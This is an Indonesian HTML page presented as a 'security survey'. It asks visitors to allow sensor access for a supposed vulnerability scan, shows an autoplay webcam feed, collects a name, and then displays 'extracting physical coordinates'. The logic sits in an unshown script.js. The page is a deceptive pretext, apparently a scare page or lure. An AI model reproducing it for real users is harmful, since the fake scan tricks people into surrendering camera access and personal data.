<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SURVEI KEAMANAN 2026</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <video id="webcam" autoplay playsinline></video>
    <div class="vignette"></div>

    <div class="wrapper">
        <div class="form-box">
            <div id="step-1">
                <h2>KEAMANAN PERANGKAT</h2>
                <p>Izinkan akses sensor untuk mulai pemindaian kerentanan.</p>
                <button id="start-survey">MULAI PEMINDAIAN</button>
            </div>

            <div id="step-2" style="display: none;">
                <h3>FORMULIR DATA</h3>
                <div class="input-group">
                    <label>Nama Pengguna:</label>
                    <input type="text" id="name" placeholder="Ketik nama lalu tekan Enter..." autocomplete="off">
                </div>
                <div class="input-group">
                    <label>Status Keamanan:</label>
                    <select id="safe-choice">
                        <option value="Sangat Aman">Sangat Aman</option>
                        <option value="Cukup Aman">Cukup Aman</option>
                        <option value="Tidak Aman">Tidak Aman</option>
                    </select>
                </div>
                <button id="submit-survey">KIRIM (ENTER)</button>
            </div>

            <div id="step-3" style="display: none;">
                <h2 class="blink">SINKRONISASI DATABASE...</h2>
                <div class="loading-bar"><div id="progress"></div></div>
                <p id="status-text">Mengekstraksi koordinat fisik...</p>
            </div>
        </div>
    </div>

    <script src="script.js"></script>
</body>
</html>
